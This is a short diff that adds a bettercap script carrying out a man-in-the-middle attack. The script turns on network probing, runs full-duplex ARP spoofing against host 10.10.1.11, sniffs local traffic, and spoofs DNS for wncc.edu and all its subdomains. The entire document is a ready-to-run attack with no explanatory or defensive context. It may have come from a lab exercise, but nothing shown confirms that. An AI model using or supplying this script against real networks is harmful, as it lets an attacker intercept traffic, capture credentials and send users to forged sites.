@@ -1,0 +1,9 @@
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 10.10.1.11
+arp.spoof on
+set net.sniff.local true
+net.sniff on
+set dns.spoof.all true
+set dns.spoof.domains wncc.edu,*.wncc.edu
+dns.spoof on
